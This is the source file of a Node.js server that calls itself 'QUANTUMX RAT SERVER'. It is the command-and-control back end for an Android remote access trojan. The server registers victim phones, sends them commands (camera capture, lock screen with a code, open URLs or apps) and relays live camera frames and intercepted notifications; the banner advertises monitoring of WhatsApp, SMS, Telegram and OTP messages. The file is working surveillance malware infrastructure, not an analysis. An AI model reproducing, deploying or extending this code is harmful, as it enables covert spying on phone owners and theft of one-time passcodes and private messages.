const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const jwt = require('jsonwebtoken');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    },
    maxHttpBufferSize: 1e8 // 100MB untuk gambar
});

// Middleware
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// ========== DATABASE ==========
let users = [
    {
        id: 1,
        username: 'admin',
        password: 'quantumx',
        role: 'admin'
    }
];

let devices = new Map();
let commands = new Map();
let commandResults = new Map();

// Camera sessions tracking
let cameraSessions = new Map(); // deviceId -> { active: boolean, socketId: string }

// ========== NOTIFICATION STORAGE ==========
let notificationsHistory = new Map(); // deviceId -> array of notifications

// ========== AUTH ==========
const JWT_SECRET = 'quantumx-super-secret-key-2024';

function authenticateToken(req, res, next) {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];
    
    if (!token) return res.status(401).json({ error: 'No token provided' });
    
    jwt.verify(token, JWT_SECRET, (err, user) => {
        if (err) return res.status(403).json({ error: 'Invalid token' });
        req.user = user;
        next();
    });
}

// ========== API ROUTES ==========

// Login
app.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    const user = users.find(u => u.username === username);
    
    if (user && password === 'quantumx') {
        const token = jwt.sign(
            { id: user.id, username: user.username, role: user.role },
            JWT_SECRET,
            { expiresIn: '24h' }
        );
        
        console.log(`✅ [LOGIN] ${username} - SUCCESS`);
        res.json({ success: true, token, user });
    } else {
        console.log(`❌ [LOGIN] ${username} - FAILED`);
        res.status(401).json({ success: false, error: 'Invalid credentials' });
    }
});

// Verify token
app.post('/api/verify', authenticateToken, (req, res) => {
    res.json({ success: true, user: req.user });
});

// Device register
app.post('/api/device/register', (req, res) => {
    const { deviceId, deviceName, androidVersion, manufacturer, model, batteryLevel, networkType, networkName } = req.body;
    
    const deviceInfo = {
        deviceId,
        deviceName: deviceName || 'Unknown Device',
        androidVersion: androidVersion || 'Unknown',
        manufacturer: manufacturer || 'Unknown',
        model: model || 'Unknown',
        batteryLevel: batteryLevel || 0,
        networkType: networkType || 'Unknown',
        networkName: networkName || '',
        lastSeen: new Date().toISOString(),
        online: true,
        ipAddress: req.ip || req.connection.remoteAddress,
        registeredAt: new Date().toISOString()
    };
    
    devices.set(deviceId, deviceInfo);
    
    console.log(`✅ [REGISTER] ${deviceName} (${deviceId}) - ANDROID: ${androidVersion} - BATTERY: ${batteryLevel}% - NETWORK: ${networkType} ${networkName}`);
    
    res.json({ success: true, deviceId, message: 'Device registered' });
});

// Get all devices
app.get('/api/devices', authenticateToken, (req, res) => {
    const deviceList = Array.from(devices.values());
    const now = new Date();
    
    deviceList.forEach(device => {
        const lastSeen = new Date(device.lastSeen);
        const diffMinutes = (now - lastSeen) / (1000 * 60);
        device.online = diffMinutes < 2;
    });
    
    res.json(deviceList);
});

// Get notifications history untuk device tertentu
app.get('/api/device/:deviceId/notifications', authenticateToken, (req, res) => {
    const deviceId = req.params.deviceId;
    const history = notificationsHistory.get(deviceId) || [];
    res.json({ 
        success: true, 
        notifications: history,
        count: history.length 
    });
});

// Clear notifications untuk device tertentu
app.delete('/api/device/:deviceId/notifications', authenticateToken, (req, res) => {
    const deviceId = req.params.deviceId;
    notificationsHistory.delete(deviceId);
    res.json({ success: true, message: 'Notifications cleared' });
});

// Send command
app.post('/api/device/:deviceId/command', authenticateToken, (req, res) => {
    const deviceId = req.params.deviceId;
    const { command, params } = req.body;
    
    const commandId = Date.now() + '-' + Math.random().toString(36).substr(2, 9);
    
    if (!commands.has(deviceId)) commands.set(deviceId, []);
    
    const commandData = {
        commandId,
        command,
        params: params || {},
        status: 'pending',
        createdAt: new Date().toISOString(),
        createdBy: req.user.username
    };
    
    commands.get(deviceId).push(commandData);
    
    // Emit ke device
    io.to(deviceId).emit('command', commandData);
    
    const deviceName = devices.get(deviceId)?.deviceName || deviceId;
    
    // LOG PERTAMA: PROSES
    if (command === 'flash') {
        console.log(`📸 [FLASH] SENDING -> ${deviceName} (${deviceId}) | DURATION: ${params?.duration || 2}s`);
    } else if (command === 'camera') {
        console.log(`📷 [CAMERA] CAPTURING -> ${deviceName} (${deviceId})`);
    } else if (command === 'vibrate') {
        console.log(`📳 [VIBRATE] SENDING -> ${deviceName} (${deviceId}) | DURATION: ${params?.duration || 2}s`);
    } else if (command === 'brightness') {
        console.log(`🔆 [BRIGHTNESS] SETTING -> ${deviceName} (${deviceId}) | LEVEL: ${params?.level || 50}%`);
    } else if (command === 'volume') {
        console.log(`🔊 [VOLUME] SETTING -> ${deviceName} (${deviceId}) | LEVEL: ${params?.level || 50}% | TYPE: ${params?.type || 'music'}`);
    } else if (command === 'fontsize') {
        console.log(`📏 [FONT SIZE] SETTING -> ${deviceName} (${deviceId}) | SCALE: ${params?.scale || 100}%`);
    } else if (command === 'sound') {
        console.log(`🎵 [SOUND] PLAYING -> ${deviceName} (${deviceId}) | DURATION: ${params?.duration || 3}s`);
    } else if (command === 'website') {
        console.log(`🌐 [WEBSITE] OPENING -> ${deviceName} (${deviceId}) | URL: ${params?.url || 'google.com'}`);
    } else if (command === 'lockscreen') {
        console.log(`🔒 [LOCKSCREEN] SENDING -> ${deviceName} (${deviceId}) | MSG: ${params?.message || 'LOCKED'} | CODE: ${params?.code || '1234'}`);
    }
    else if (command === 'send-notification') {
    console.log(`📨 [SEND NOTIFICATION] SENDING -> ${deviceName} (${deviceId}) | TITLE: ${params?.title} | MSG: ${params?.message}`);
    
}
else if (command === 'open-app') {
    console.log(`🚀 [OPEN APP] SENDING -> ${deviceName} (${deviceId}) | PACKAGE: ${params?.package}`);
}
    
    res.json({ success: true, commandId, message: 'Command sent' });
});

// Command result
app.post('/api/device/command/result', (req, res) => {
    const { commandId, deviceId, status, result } = req.body;
    
    const deviceCommands = commands.get(deviceId) || [];
    const commandIndex = deviceCommands.findIndex(cmd => cmd.commandId === commandId);
    
    if (commandIndex !== -1) {
        deviceCommands[commandIndex].status = status || 'completed';
        deviceCommands[commandIndex].result = result;
        deviceCommands[commandIndex].completedAt = new Date().toISOString();
        commands.set(deviceId, deviceCommands);
        
        commandResults.set(commandId, {
            deviceId,
            command: deviceCommands[commandIndex].command,
            status,
            result,
            completedAt: new Date().toISOString()
        });
        
        io.emit('command-result', { commandId, deviceId, status, result, command: deviceCommands[commandIndex].command });
        
        const deviceName = devices.get(deviceId)?.deviceName || deviceId;
        
        // LOG KEDUA: HASIL
        if (deviceCommands[commandIndex].command === 'flash') {
            if (status === 'completed') {
                console.log(`✅ [FLASH] SUCCESS -> ${deviceName} | DURATION: ${result?.duration}s`);
            } else {
                console.log(`❌ [FLASH] FAILED -> ${deviceName}`);
            }
        } else if (deviceCommands[commandIndex].command === 'camera') {
            if (status === 'completed') {
                console.log(`✅ [CAMERA] SUCCESS -> ${deviceName} | PHOTO TAKEN`);
            } else {
                console.log(`❌ [CAMERA] FAILED -> ${deviceName}`);
            }
        } else if (deviceCommands[commandIndex].command === 'vibrate') {
            if (status === 'completed') {
                console.log(`✅ [VIBRATE] SUCCESS -> ${deviceName} | DURATION: ${result?.duration}s`);
            } else {
                console.log(`❌ [VIBRATE] FAILED -> ${deviceName}`);
            }
        } else if (deviceCommands[commandIndex].command === 'brightness') {
            if (status === 'completed') {
                console.log(`✅ [BRIGHTNESS] SUCCESS -> ${deviceName} | LEVEL: ${result?.level}%`);
            } else {
                console.log(`❌ [BRIGHTNESS] FAILED -> ${deviceName}`);
            }
        } else if (deviceCommands[commandIndex].command === 'volume') {
            if (status === 'completed') {
                console.log(`✅ [VOLUME] SUCCESS -> ${deviceName} | LEVEL: ${result?.level}% | TYPE: ${result?.type || 'music'}`);
            } else {
                console.log(`❌ [VOLUME] FAILED -> ${deviceName}`);
            }
        } else if (deviceCommands[commandIndex].command === 'fontsize') {
            if (status === 'completed') {
                console.log(`✅ [FONT SIZE] SUCCESS -> ${deviceName} | SCALE: ${result?.scale}%`);
            } else {
                console.log(`❌ [FONT SIZE] FAILED -> ${deviceName}`);
            }
        } else if (deviceCommands[commandIndex].command === 'sound') {
            if (status === 'completed') {
                console.log(`✅ [SOUND] SUCCESS -> ${deviceName} | DURATION: ${result?.duration}s`);
            } else {
                console.log(`❌ [SOUND] FAILED -> ${deviceName}`);
            }
        } else if (deviceCommands[commandIndex].command === 'website') {
            if (status === 'completed') {
                console.log(`✅ [WEBSITE] SUCCESS -> ${deviceName} | URL: ${result?.url}`);
            } else {
                console.log(`❌ [WEBSITE] FAILED -> ${deviceName}`);
            }
        } else if (deviceCommands[commandIndex].command === 'lockscreen') {
            if (status === 'completed') {
                console.log(`✅ [LOCKSCREEN] SUCCESS -> ${deviceName} | LOCK ACTIVE`);
            } else {
                console.log(`❌ [LOCKSCREEN] FAILED -> ${deviceName}`);
            }
        }
        else if (deviceCommands[commandIndex].command === 'send-notification') {
    if (status === 'completed') {
        console.log(`✅ [SEND NOTIFICATION] SUCCESS -> ${deviceName} | TITLE: ${result?.title}`);
    } else {
        console.log(`❌ [SEND NOTIFICATION] FAILED -> ${deviceName}`);
    }
    
}
else if (deviceCommands[commandIndex].command === 'open-app') {
    if (status === 'completed') {
        console.log(`✅ [OPEN APP] SUCCESS -> ${deviceName} | PACKAGE: ${result?.package}`);
    } else {
        console.log(`❌ [OPEN APP] FAILED -> ${deviceName} | PACKAGE: ${result?.package} | ERROR: ${result?.error || 'Unknown'}`);
    }
}
    }
    
    res.json({ success: true });
});

// ========== WEBSOCKET ==========
io.on('connection', (socket) => {
    console.log(`🔌 [SOCKET] CONNECTED: ${socket.id}`);
    
    // ===== DEVICE CONNECT (DARI APK) =====
    socket.on('device-connect', (data) => {
        const { 
            deviceId, 
            deviceName, 
            androidVersion, 
            manufacturer, 
            model, 
            batteryLevel,
            networkType,
            networkName
        } = data;
        
        socket.deviceId = deviceId;
        socket.deviceType = 'device';
        socket.join(deviceId);
        
        // Update atau simpan device dengan DATA LENGKAP
        if (devices.has(deviceId)) {
            const device = devices.get(deviceId);
            device.online = true;
            device.lastSeen = new Date().toISOString();
            device.deviceName = deviceName || device.deviceName;
            device.androidVersion = androidVersion || device.androidVersion;
            device.manufacturer = manufacturer || device.manufacturer;
            device.model = model || device.model;
            device.batteryLevel = batteryLevel || device.batteryLevel;
            device.networkType = networkType || device.networkType || 'Unknown';
            device.networkName = networkName || device.networkName || '';
            devices.set(deviceId, device);
        } else {
            const deviceInfo = {
                deviceId,
                deviceName: deviceName || 'Unknown Device',
                androidVersion: androidVersion || 'Unknown',
                manufacturer: manufacturer || 'Unknown',
                model: model || 'Unknown',
                batteryLevel: batteryLevel || 0,
                networkType: networkType || 'Unknown',
                networkName: networkName || '',
                lastSeen: new Date().toISOString(),
                online: true,
                registeredAt: new Date().toISOString()
            };
            devices.set(deviceId, deviceInfo);
        }
        
        console.log(`📱 [DEVICE] ONLINE: ${deviceName} (${deviceId}) - ANDROID: ${androidVersion} - BATTERY: ${batteryLevel}% - NETWORK: ${networkType} ${networkName}`);
        
        // KIRIM DATA LENGKAP KE PANEL!
        io.emit('device-status', {
            deviceId,
            deviceName,
            androidVersion,
            manufacturer,
            model,
            batteryLevel,
            networkType,
            networkName,
            status: 'online',
            timestamp: new Date().toISOString()
        });
    });
    
    // ===== NOTIFICATION DARI APK =====
    socket.on('notification', (data) => {
        const { deviceId, package: packageName, text, title, content, time } = data;
        
        
        // Update last seen device
        if (devices.has(deviceId)) {
            const device = devices.get(deviceId);
            device.lastSeen = new Date().toISOString();
            devices.set(deviceId, device);
        }
        
        // Simpan ke history
        if (!notificationsHistory.has(deviceId)) {
            notificationsHistory.set(deviceId, []);
        }
        
        const notificationData = {
            deviceId,
            package: packageName,
            text,
            title,
            content,
            time: time || Date.now(),
            receivedAt: new Date().toISOString()
        };
        
        const history = notificationsHistory.get(deviceId);
        history.unshift(notificationData);
        // Batasi hanya 50 notifikasi terakhir
        if (history.length > 50) history.pop();
        
        // Kirim ke semua panel
        io.emit('notification', notificationData);
    });
    
    // ===== HEARTBEAT DARI APK =====
    socket.on('heartbeat', (data) => {
        const { deviceId, batteryLevel, deviceName, androidVersion, networkType, networkName } = data;
        
        if (devices.has(deviceId)) {
            const device = devices.get(deviceId);
            device.lastSeen = new Date().toISOString();
            device.online = true;
            device.batteryLevel = batteryLevel || device.batteryLevel;
            device.deviceName = deviceName || device.deviceName;
            device.androidVersion = androidVersion || device.androidVersion;
            device.networkType = networkType || device.networkType || 'Unknown';
            device.networkName = networkName || device.networkName || '';
            devices.set(deviceId, device);
        }
        
        // KIRIM HEARTBEAT KE PANEL (UPDATE DATA)
        io.emit('heartbeat', {
            deviceId,
            batteryLevel,
            deviceName,
            androidVersion,
            networkType,
            networkName,
            timestamp: new Date().toISOString()
        });
        
        // Log heartbeat (1% chance)
        if (Math.random() < 0.01) {
            console.log(`💓 [HEARTBEAT] ${deviceName} (${deviceId}) - BATTERY: ${batteryLevel}% - NETWORK: ${networkType} ${networkName}`);
        }
    });
    
    // ===== CAMERA FRAME DARI APK =====
    socket.on('camera-frame', (data) => {
        const { deviceId, imageData, timestamp } = data;
        
        // Validasi device
        if (!deviceId) return;
        
        // Update last seen device
        if (devices.has(deviceId)) {
            const device = devices.get(deviceId);
            device.lastSeen = new Date().toISOString();
            devices.set(deviceId, device);
        }
        
        // Kirim frame ke semua panel
        io.emit('camera-frame', {
            deviceId,
            imageData,
            timestamp: timestamp || Date.now()
        });
    });
    
    // ===== PANEL CONNECT =====
    socket.on('panel-connect', () => {
        socket.isPanel = true;
        socket.deviceType = 'panel';
        console.log(`🖥️ [PANEL] CONNECTED: ${socket.id}`);
    });
    
    // ===== DISCONNECT =====
    socket.on('disconnect', () => {
        if (socket.deviceId) {
            const deviceId = socket.deviceId;
            
            if (devices.has(deviceId)) {
                const device = devices.get(deviceId);
                device.online = false;
                devices.set(deviceId, device);
                
                // Hapus camera session jika ada
                if (cameraSessions.has(deviceId)) {
                    cameraSessions.delete(deviceId);
                }
            }
            
            const deviceName = devices.get(deviceId)?.deviceName || deviceId;
            console.log(`📱 [DEVICE] OFFLINE: ${deviceName} (${deviceId})`);
            
            io.emit('device-status', {
                deviceId,
                status: 'offline',
                timestamp: new Date().toISOString()
            });
        } else {
            console.log(`🔌 [SOCKET] DISCONNECTED: ${socket.id}`);
        }
    });
});

// ========== STATS ==========
app.get('/api/stats', authenticateToken, (req, res) => {
    const deviceList = Array.from(devices.values());
    const now = new Date();
    
    let onlineCount = 0;
    deviceList.forEach(device => {
        const lastSeen = new Date(device.lastSeen);
        const diffMinutes = (now - lastSeen) / (1000 * 60);
        if (diffMinutes < 2) onlineCount++;
    });
    
    res.json({
        totalDevices: devices.size,
        onlineDevices: onlineCount,
        totalCommands: commandResults.size,
        pendingCommands: Array.from(commands.values()).flat().filter(c => c.status === 'pending').length,
        activeCameras: cameraSessions.size
    });
});

// ========== START ==========
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`
╔══════════════════════════════════════════════════════════════╗
║              QUANTUMX RAT SERVER v8.0 - FINAL                ║
╠══════════════════════════════════════════════════════════════╣
║  RUNNING ON PORT: ${PORT}                                                ║
║  WEBSOCKET: ws://localhost:${PORT}                                       ║
║  API: http://localhost:${PORT}/api                                      ║
║  NEW: NOTIFICATION MONITOR (WhatsApp, SMS, Telegram, OTP)   ║
╠══════════════════════════════════════════════════════════════╣
    `);
});
